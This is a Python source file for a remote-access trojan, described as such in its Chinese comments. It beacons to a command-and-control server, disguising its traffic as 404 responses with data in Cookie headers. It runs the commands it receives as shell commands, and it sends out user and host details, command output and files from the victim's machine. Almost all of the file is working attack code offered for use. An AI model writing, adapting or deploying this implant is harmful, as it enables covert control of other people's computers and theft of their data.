from subprocess import Popen,PIPE
from socket import socket,AF_INET,SOCK_DGRAM
from getpass import getuser
from platform import platform
from time import sleep
from os import name
from requests import post,packages
from json import dumps,loads
from base64 import b64encode,b64decode
from os.path import basename,getsize,exists,isfile
from Crypto.Cipher import AES
from binascii import a2b_hex, b2a_hex

packages.urllib3.disable_warnings() #取消警告
key = ''
IP = "127.0.0.1" #服务器IP地址
PORT = 9001 #服务器端口

class DataAesCrypt:
    """
    介绍：
    该模块是用来对数据进行 AES 加密解密处理的，主要负责木马与C2服务器的通信安全
    里面现主要有两个方法，encrypt 是负责对数据进行加密处理的，decrypt 是负责对数据进行解密的

    使用方法：
    DataAesCrypt(木马的随机md5值，数据).加密或解密方法
    """
    def __init__(self,keys:str,data:str) -> None:
        self.keys = keys[:16].encode("utf-8") #取随机秘钥的前16位,该随机秘钥是木马上线时得到的随机秘钥
        self.data = data #这是要处理的数据

    def encrypt(self):
        text = self.data + (16 - (len(self.data) % 16)) * "=" #对数据进行位数校验,是否为16的倍数
        aes = AES.new(self.keys, AES.MODE_ECB) #实例化一个 AES 对象
        en_text = b2a_hex(aes.encrypt(text.encode("utf-8"))) #加密数据
        return en_text.decode("utf-8") #将数据从 bytes 类型转为 str 后返回
    
    def decrypt(self):
        aes = AES.new(self.keys, AES.MODE_ECB) #实例化一个 AES 对象
        text = aes.decrypt(a2b_hex(self.data.encode("utf-8"))) #对数据进行解密
        return text.decode("utf-8").split("=")[0] #将数据处理好后返回

class BaseFunc:
    def __init__(self) -> None:
        self.localuser = getuser() #获取当前的用户名称
        self.sys_info = platform() #获取当前的操作系统平台
        self.key_url = "https://"+IP+":"+str(PORT)+"/getkeys"
        self.pay_url = "https://"+IP+":"+str(PORT)+"/getname"
        self.ret_url = "https://"+IP+":"+str(PORT)+"/addrst"

    def getbaseinfo(self) -> dict:
        """
        描述：
          该方法是用来获取当前上线主机的一些基础信息的
        
        使用方法：
          data = getbaseinfo()
        
        返回结果：
          字典：{"localuser":当前的用户名称,"sys_info":系统架构信息,"local_ip":本地的IP地址}
        """
        try:
            s = socket(AF_INET,SOCK_DGRAM)
            s.connect(('baidu.com',0)) #请根据实际来获取本地地址，不一定要使用这种方式
            local_ip = s.getsockname()[0]
            rst = {"localuser":self.localuser,"sys_info":self.sys_info,"local_ip":local_ip}
        except:
            rst = {"localuser":self.localuser,"sys_info":self.sys_info,"local_ip":None}
        finally:
            return rst

    def getkeys(self) -> list:
        """
        描述：
          该方法是用来获取随机唯一身份ID和随机AES加密秘钥的
        
        访问方法：
          data = getkeys()
        
        返回数据：
          列表：["唯一身份ID","随机AES加密秘钥"]
        """
        rst = post(url=self.key_url,timeout=5,verify=False)
        if rst.status_code == 404 and rst.headers.get("Cookie"):
            rst = loads(b64decode(rst.headers.get("Cookie")).decode("utf-8"))
            return rst.get("key").split(":") #对服务器返回结果：唯一身份ID:随机AES加密秘钥 这一个字符串进行切割
        else:
            return "error"
    
    def getpay(self,key:str, aeskey:str):
        """
        描述：
          该方法是用来获取 Payload 的
        
        访问方法：
          data = getpay(唯一身份ID，AES秘钥)
        
        返回数据：
          成功返回字典：{"sleeptime":"睡眠时间","cdm":"要执行的命令"}
          失败返回：False
        """
        head = {"Cookie":"cid="+key}
        rst = post(url=self.pay_url,headers=head,timeout=5,verify=False)
        if rst.status_code == 404 and rst.headers.get("Cookie"):
            #rst = loads(b64decode(rst.headers.get("Cookie")).decode("utf-8"))
            rst = loads(DataAesCrypt(aeskey,rst.headers.get("Cookie")).decrypt()) #将AES解密后的字符串进行json反序列化
            return rst#rst.get("data")
        if rst.status_code == 500:
            return "exit"
        else:
            return False

    def exc(self,cdm:str):
        """
        描述：
          该方法是用来执行系统命令的
        
        访问方法：
          data = exc("要执行的命令")
        
        返回数据：
          字典：{"localuser":当前的用户名称,"sys_info":系统架构信息,"local_ip":本地的IP地址,"cdm":"执行的命令","data":"命令执行的结果"}
          失败：None
        """
        rst = self.getbaseinfo()
        if isinstance(cdm,str) and cdm != '':
            if cdm == "getlive":
                rst['cdm'] = "getlive"
                rst['data'] = "上线成功！"#str(b64encode("上线成功！".encode("utf-8"))).split("'")[1]
            elif cdm == "set time":
                rst["cdm"] = "set time"
                rst["data"] = "时间设置成功"
            else:
                r = Popen(cdm,shell=True,stderr=PIPE,stdout=PIPE) #执行命令
                r = r.stdout.read() #获取执行结果
                if r:
                    pass
                else:
                    r = "命令执行失败！".encode("utf-8")
                rst['cdm'] = cdm
                rst['data'] = r.decode("utf-8") #对执行结果进行解码
            return rst
        else:
            return None
    def downfile(self):
        """
        描述：
          该方法是用来下载控制端上传的文件的
        
        使用方法：
          downfile()
        
        没有返回数据
        """
        sleep(2)
        s = socket()
        s.connect((IP,60000)) #连接服务器开放的 60000 号端口
        s.send("t".encode("utf-8")) #发送身份标识，t 代表我是数据接收方
        filename = ''
        filesize = ''
        filewritedir = ''
        data = s.recv(1024) #接收的服务端传来的文件头部信息
        if data:
            try:
                data = data.decode("utf-8") 
                data = data.split("'")[1] #处理 b'base64密文' ==》 ["b","数据base64密文"]
                data = loads(b64decode(data).decode("utf-8")) #对文件头数据进行base64解密后，再进行 json 反序列化
                #处理文件信息，文件名称、文件大小、要写入的目标目录
                filename = data.get("filename")
                filesize = data.get("filesize")
                filewritedir = data.get("filewritedir")
                #检查要写入的目标目录是否合法
                if exists(filewritedir) and not isfile(filewritedir):
                    pass
                else:
                    #不合法则重新设置到临时目录
                    if name == "nt":
                        filewritedir = "C:\\windows\\temp\\"
                    else:
                        filewritedir = "/tmp/"
                with open(filewritedir+filename,"wb") as fp:
                        if isinstance(data,str):
                            data = data.encode("utf-8")
                            filesize -= len(data)
                            fp.write(data) #写入第一段数据
                        #使用 while 循环不断接收文件数据，知道文件校验大小为 0 时退出
                        while filesize >0:
                            data = s.recv(1024)
                            if data:
                                filesize -= len(data) #对文件数据长度进行校验
                                fp.write(data)
                                if filesize == 0:
                                    fp.flush()
                                    #向控制端发送文件传输完成信息
                                    s.send(dumps({"whoami":"t","data":"exit"}).encode("utf-8"))
            except:
                pass
        s.send(dumps({"whoami":"exit"}).encode("utf-8")) #向服务器发送退出连接信息
        s.close()

    def uploadfile(self,filepath,targetfilepath=''):
        """
        描述：
          该方法是用来处理上传被控端文件到控制端的
        
        使用方法：
          uploadfile(目标文件路径)
        
        无返回数据
        """
        sleep(2)
        s = socket()
        s.connect((IP,60000))
        s.send("c".encode("utf-8")) #发送身份标识，c 表示我是文件数据发送方
        switch = True
        #判断要上传的文件是否合法
        if exists(filepath) and isfile(filepath):
            filename = basename(filepath)
            filesize = getsize(filepath)
        #如果文件不合法，则设置特殊文件头部信息发给接收方，告知其下载的文件不合法
        else:
            filename = "nofile"
            filesize = -1
        #监听接收服务器发来的 {"info":"yes"} 信息，接收到该信息表示，都已经上线，可以开始发送文件头部信息
        while True:
            data = s.recv(1024)
            if data:
                isok = loads(data.decode("utf-8"))
                break
        if isinstance(isok,dict) and isok.get("info") == "yes": #判断是否可以进行文件传输
            while switch:
                filehead = {"filename":filename,"filesize":filesize,"filewritedir":targetfilepath}
                data = {"whoami":"c","data":str(b64encode(dumps(filehead).encode("utf-8")))}
                #发送文件头部信息：{"whoami":"c","data":base64密文}
                s.send(dumps(data).encode("utf-8"))
                if filename == "nofile" and filesize == -1:
                    break #如果目标文件无效则退出
                sleep(1)
                data = {"whoami":"c","data":"senddata"} #开始发送文件数据前的提示信息
                s.send(dumps(data).encode("utf-8")) #当文件接收方接收到此信息则代表可以接收文件数据了
                #循环发送文件数据
                with open(filepath,"rb") as fp:
                    while filesize >0:
                        content = fp.read(1024)
                        filesize -= len(content)
                        s.sendall(content) #发送全部
                        if filesize == 0:
                            switch = False
                            break        
        #控制退出
        while True:
            data = s.recv(1024)
            if data:
                data = data.decode("utf-8")
                #确认控制端退出
                if data == "exit":
                    break
        #向服务器发送退出信号，并结束socket
        s.send(dumps({"whoami":"exit"}).encode("utf-8"))
        s.close()

def main():
    """
    描述：
      该函数是木马的主要控制逻辑，负责各种功能的调配和错误处理
    """
    base = BaseFunc()
    key, aes_key = base.getkeys() #启动后获取唯一身份标识ID和AES加密秘钥
    time = 10 #设置默认睡眠时间为 10 秒
    while True:
        if key:
            try:
                rst = base.getpay(key,aes_key) #使用唯一身份标识和AES加密秘钥来请求服务器的 payload
                if rst == "exit": #判断是否要退出
                    break
                if isinstance(rst,dict) and isinstance(rst.get("cdm"),str):
                    if rst.get("sleeptime"):
                        time = float(rst.get("sleeptime"))
                        #判断控制端设置的睡眠时间是否合法
                        if time < 0:
                            time = 10
                    c = rst.get("cdm")
                    if c == "exit_yes":#判断控制端是否发送了退出命令
                        break
                    elif c == "uploadfile": #这是控制端要上传文件的处理
                        base.downfile()
                        rst = base.getbaseinfo()
                        rst['cdm'] = "uploadfile"
                        rst['data'] = "文件上传执行完毕！"
                    elif c.split(' ')[0].strip() == "downfile": #这是控制端要下载文件的处理
                        base.uploadfile(c.split(' ')[1].strip())
                        rst = base.getbaseinfo()
                        rst["cdm"] = "downfile"
                        rst["data"] = "文件下载执行完毕！"
                    else:
                        rst = base.exc(c) #执行系统命令的处理
                    #返回执行结果
                    if isinstance(rst,dict):
                        head = {"Cookie":"cid="+key} #将唯一身份标识ID设置到请求头部的Cookie字段中
                        data = {"data":DataAesCrypt(aes_key,dumps(rst)).encrypt()} #对数据进行加密后放到请求体
                        #print("请求头：{}\n请求体:{}\n数据内容：{}".format(head,data,rst))
                        rst = post(url=base.ret_url,headers=head,data=data,timeout=5,verify=False) #verify的参数是解决 ssl 认证错误的报错
            except:
                pass
            sleep(time) #进入睡眠
        else:
            break

if __name__ == "__main__":
    main()




